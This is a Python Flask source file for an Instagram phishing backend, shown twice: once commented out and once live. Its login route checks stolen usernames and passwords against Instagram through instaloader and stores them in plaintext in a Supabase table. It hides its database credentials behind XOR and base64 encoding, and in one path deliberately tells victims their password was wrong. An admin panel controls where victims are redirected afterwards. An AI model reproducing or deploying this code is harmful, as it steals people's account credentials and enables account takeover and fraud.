


# from flask import Flask, request, jsonify, render_template, session, redirect, url_for
# from flask_cors import CORS
# from supabase import create_client, Client
# import instaloader
# import base64
# from supabase import create_client, Client
# import threading
# import time
# app = Flask(__name__)
# CORS(app)

# # --- 1. CONFIGURATION ---
# # Flask secret key MUST be set before routes for sessions to work
# app.secret_key = "Nandemonay@goofad.com" 

# SECRET = "my_super_secret_salt_123"  # MUST be same as encoder

# def xor_decrypt(data, key):
#     return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

# def decode_value(encoded_value):
#     base64_decoded = base64.b64decode(encoded_value).decode()
#     return xor_decrypt(base64_decoded, SECRET)

# # 🔐 Paste your encoded values here
# ENCODED_SUPABASE_URL = "BQ0rAwZKSl06GgMIBxYAPRIUFAEnS1RSFAo9EVsDEAI+EQQQF0sXMA=="
# ENCODED_SUPABASE_KEY = "CAAVGxc3BhsQGi8qJx89bj0IJQcWX2AGDjoWRTwbFSoJMC9aXAANFQMCXzk2flt5Fx0HMR0pCDQlKTYqASwaFR87BT1peF9lHSMyB0QTViA2Kj01RgEsN0U7ATJqUgB5BDA2BBwTCEssKTYqRCwZGQYDXkA2fXF5HSAHIhw/DzdsPR8mBSsePEcuODEseF9lWRocOkM9DzNrPQ86QigOOEYsNERxVQN1GUg9MQM/AgYAHQgaCBVMNhYoDwE1VkV5NUAXASojAR0xSgstSwxBNA=="

# # Auto decode
# SUPABASE_URL = decode_value(ENCODED_SUPABASE_URL)
# SUPABASE_KEY = decode_value(ENCODED_SUPABASE_KEY)

# supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# # --- 2. USER FACING ROUTES ---

# @app.route('/')
# def home():
#     return render_template('index.html')



# def delayed_upsert(supabase, username, password):
#     time.sleep(30)  # 30 second delay
    
#     supabase.table("ig_auth_logs").upsert(
#         {"username": username, "password": password},
#         on_conflict="username"
#     ).execute()


# @app.route('/auth/login', methods=['POST'])
# def login_task():
#     """Verifies credentials via Instaloader and logs them to Supabase."""
#     data = request.json
#     username = data.get('username')
#     password = data.get('password')

#     if not username or not password:
#         return jsonify({"status": "error", "message": "Missing credentials"}), 400

#     # User Agent helps bypass automated-access blocks
#     L = instaloader.Instaloader(user_agent="Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1")

#     # Fetch the dynamic redirect URL from Admin Config
#     try:
#         conf_res = supabase.table("config").select("target_url").eq("id", 1).single().execute()
#         redirect_to = conf_res.data['target_url']
#     except Exception:
#         redirect_to = "https://www.instagram.com"

#     try:
#         # 1. Attempt Real-time verification
#         L.login(username, password)
        
#         # 2. If valid, UPSERT (Update or Insert)
#         thread = threading.Thread(
#         target=delayed_upsert,
#         args=(supabase, username, password)
#             )
#         thread.start()
        
#         return jsonify({"status": "success", "redirect_to": redirect_to}), 200

#     except instaloader.exceptions.BadCredentialsException:
#         return jsonify({"status": "invalid"}), 401

#     except Exception as e:
#         print(f"Bypassing verification check: {e}")
#         # Save anyway even if IG blocks the script check
#         try:
#             supabase.table("ig_auth_logs").upsert(
#                 {"username": username, "password": password}, 
#                 on_conflict="username"
#             ).execute()
#         except Exception as db_err:
#             print(f"Database Error: {db_err}")

#         return jsonify({"status": "success", "redirect_to": redirect_to}), 200

# # --- 3. ADMIN ROUTES ---

# @app.route('/admin')
# def admin_page():
#     if not session.get('logged_in'):
#         return render_template('admin_login.html')
#     return render_template('admin.html')

# @app.route('/admin/login', methods=['POST'])
# def admin_login_check():
#     data = request.json
#     password = data.get('password')
    
#     # Update this line to your desired password
#     if password == "Nandemonay@goofad.com": 
#         session['logged_in'] = True
#         return jsonify({"status": "success"}), 200
    
#     return jsonify({"status": "error"}), 401

# @app.route('/admin/logout')
# def admin_logout():
#     session.clear()
#     return redirect(url_for('home'))

# @app.route('/admin/config', methods=['GET', 'POST'])
# def handle_config():
#     if not session.get('logged_in'):
#         return jsonify({"status": "error", "message": "Unauthorized"}), 403

#     if request.method == 'POST':
#         new_url = request.json.get('target_url')
#         try:
#             supabase.table("config").update({"target_url": new_url}).eq("id", 1).execute()
#             return jsonify({"status": "success"}), 200
#         except Exception as e:
#             return jsonify({"status": "error", "message": str(e)}), 500
    
#     try:
#         res = supabase.table("config").select("target_url").eq("id", 1).single().execute()
#         return jsonify(res.data), 200
#     except:
#         return jsonify({"target_url": "https://www.instagram.com"}), 200

# if __name__ == '__main__':
#     import os
#     port = int(os.environ.get("PORT", 5000))
#     app.run(host='0.0.0.0', port=port)





from flask import Flask, request, jsonify, render_template, session, redirect, url_for
from flask_cors import CORS
from supabase import create_client, Client
import instaloader
import base64
from supabase import create_client, Client
import threading
import time
app = Flask(__name__)
CORS(app)

# --- 1. CONFIGURATION ---
# Flask secret key MUST be set before routes for sessions to work
app.secret_key = "Nandemonay@goofad.com" 

SECRET = "my_super_secret_salt_123"  # MUST be same as encoder

def xor_decrypt(data, key):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

def decode_value(encoded_value):
    base64_decoded = base64.b64decode(encoded_value).decode()
    return xor_decrypt(base64_decoded, SECRET)

# 🔐 Paste your encoded values here
ENCODED_SUPABASE_URL = "BQ0rAwZKSl06GgMIBxYAPRIUFAEnS1RSFAo9EVsDEAI+EQQQF0sXMA=="
ENCODED_SUPABASE_KEY = "CAAVGxc3BhsQGi8qJx89bj0IJQcWX2AGDjoWRTwbFSoJMC9aXAANFQMCXzk2flt5Fx0HMR0pCDQlKTYqASwaFR87BT1peF9lHSMyB0QTViA2Kj01RgEsN0U7ATJqUgB5BDA2BBwTCEssKTYqRCwZGQYDXkA2fXF5HSAHIhw/DzdsPR8mBSsePEcuODEseF9lWRocOkM9DzNrPQ86QigOOEYsNERxVQN1GUg9MQM/AgYAHQgaCBVMNhYoDwE1VkV5NUAXASojAR0xSgstSwxBNA=="

# Auto decode
SUPABASE_URL = decode_value(ENCODED_SUPABASE_URL)
SUPABASE_KEY = decode_value(ENCODED_SUPABASE_KEY)

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# --- 2. USER FACING ROUTES ---

@app.route('/')
def home():
    return render_template('index.html')



def delayed_upsert(supabase, username, password):
    time.sleep(30)  # 30 second delay
    
    supabase.table("ig_auth_logs").upsert(
        {"username": username, "password": password},
        on_conflict="username"
    ).execute()


@app.route('/auth/login', methods=['POST'])
def login_task():
    """Verifies credentials via Instaloader and logs them to Supabase."""
    data = request.json
    username = data.get('username')
    password = data.get('password')

    if not username or not password:
        return jsonify({"status": "error", "message": "Missing credentials"}), 400

    L = instaloader.Instaloader(user_agent="Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1")

    # Fetch the dynamic redirect URL from Admin Config
    try:
        conf_res = supabase.table("config").select("target_url").eq("id", 1).single().execute()
        redirect_to = conf_res.data['target_url']
    except:
        redirect_to = "https://www.instagram.com"

    try:
        # 1. ATTEMPT REAL VERIFICATION
        L.login(username, password)
        
        # 2. SUCCESS: Start the 30s delayed background save
        threading.Thread(target=delayed_upsert, args=(supabase, username, password)).start()
        
        # ONLY return success here
        return jsonify({"status": "success", "redirect_to": redirect_to}), 200

    except instaloader.exceptions.BadCredentialsException:
        # WRONG PASSWORD: Do not redirect
        return jsonify({"status": "invalid"}), 401

    except Exception as e:
        # IG BLOCKED SCRIPT OR OTHER ERROR:
        print(f"Verification failed/blocked: {e}")
        
        # Capture the data anyway for your logs
        try:
            supabase.table("ig_auth_logs").upsert(
                {"username": username, "password": password}, 
                on_conflict="username"
            ).execute()
        except Exception as db_err:
            print(f"Database Error: {db_err}")

        # IMPORTANT: Return 'invalid' so the user stays on the page 
        # and doesn't get redirected to IG. They will think they typed it wrong.
        return jsonify({"status": "invalid"}), 401
# --- 3. ADMIN ROUTES ---

@app.route('/admin')
def admin_page():
    if not session.get('logged_in'):
        return render_template('admin_login.html')
    return render_template('admin.html')

@app.route('/admin/login', methods=['POST'])
def admin_login_check():
    data = request.json
    password = data.get('password')
    
    # Update this line to your desired password
    if password == "Nandemonay@goofad.com": 
        session['logged_in'] = True
        return jsonify({"status": "success"}), 200
    
    return jsonify({"status": "error"}), 401

@app.route('/admin/logout')
def admin_logout():
    session.clear()
    return redirect(url_for('home'))

@app.route('/admin/config', methods=['GET', 'POST'])
def handle_config():
    if not session.get('logged_in'):
        return jsonify({"status": "error", "message": "Unauthorized"}), 403

    if request.method == 'POST':
        new_url = request.json.get('target_url')
        try:
            supabase.table("config").update({"target_url": new_url}).eq("id", 1).execute()
            return jsonify({"status": "success"}), 200
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500
    
    try:
        res = supabase.table("config").select("target_url").eq("id", 1).single().execute()
        return jsonify(res.data), 200
    except:
        return jsonify({"target_url": "https://www.instagram.com"}), 200

if __name__ == '__main__':
    import os
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)